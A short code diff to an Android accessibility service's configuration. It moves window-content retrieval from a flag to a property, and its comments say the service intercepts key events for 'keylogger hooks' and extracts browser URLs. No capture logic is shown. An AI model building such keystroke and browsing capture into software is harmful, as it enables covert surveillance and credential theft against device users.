@@ -74,10 +74,9 @@ class AccessibilityServiceImpl : AccessibilityService() {
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                     // Enables key-event interception so the accessibility service
                     // receives onKeyEvent (needed for keylogger hooks).
-                    AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS or
-                    // Required for rootInActiveWindow() to return a non-null
-                    // node (URL extraction in browsers).
-                    AccessibilityServiceInfo.FLAG_RETRIEVE_WINDOW_CONTENT
+                    AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
+            // Required for rootInActiveWindow() to return a non-null node
+            // (URL extraction in browsers).
             canRetrieveWindowContent = true
             notificationTimeout = 100
         })
